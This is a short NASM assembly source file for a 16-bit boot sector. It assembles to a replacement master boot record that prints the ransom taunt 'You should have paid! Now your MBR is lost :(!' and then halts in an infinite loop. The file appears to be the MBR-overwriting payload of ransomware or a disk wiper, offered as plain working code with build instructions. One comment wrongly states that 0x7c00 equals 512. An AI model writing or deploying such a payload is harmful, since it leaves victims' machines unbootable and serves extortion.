;----------------------------------------------;
; We will be using nasm with x86 instructions- available on most machines.
; nasm -f bin asmCode.asm -o data.bin
;
; 
;
;----------------------------------------------;
 
BITS 16
ORG     0x7c00                  ; 0x7c00 = 512
jmp start
 
start:
        mov ax,cs
        mov ds,ax
        mov si,msg          ;Si = The address of the message we want to print
        call print
 
print:
        push ax
        cld
next:
        mov al,[si]
        cmp al,0            ;Compare the char with 0
        je done             ;Jump on equal to end
        call printchar      ; Prints the char
        inc si              ;move to the next position in the string
        jmp next            ;repeat
done:
        jmp $               ;infinite loop - $ = crt instruction.
 
printchar:
        mov ah,0x0e         ;print char service
        int 0x10            ;print char
        ret
  
msg:            db        "You should have paid! Now your MBR is lost :(!", 0
;----------------------------------------------;
; The bootloader has a signature (0xaa55)
; at bytes #511 and #512.
; Fill with 0 in between.
; $  = address of the current line
; $$ = address of the 1st instruction
;----------------------------------------------;
  
times 510 - ($-$$) db 0
dw        0xaa55 ; Bootloader signature